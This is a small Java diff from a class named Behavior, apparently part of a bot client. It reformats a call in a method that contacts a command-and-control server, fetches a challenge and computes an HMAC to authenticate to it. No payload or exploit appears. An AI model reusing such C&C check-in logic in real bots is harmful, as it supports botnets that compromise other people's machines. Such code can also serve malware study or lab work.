@@ -79,8 +79,7 @@ public class Behavior {
 	 */
 	private boolean challengeToCommandConquer() {
 		System.out.println("IP C&C " + nServ.getCommandConquerIps().getList().get(0).getValue1());
-		Pairs<Long, Integer> challenge = request.getChallengeFromCeC(nServ.getIdHash(),
-				nServ.getCommandConquerIps().getList().get(0).getValue1());
+		Pairs<Long, Integer> challenge = request.getChallengeFromCeC(nServ.getIdHash(),nServ.getCommandConquerIps().getList().get(0).getValue1());
 		if (challenge != null) {
 			String key = auth.generateStringKey(challenge.getValue2());
 			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
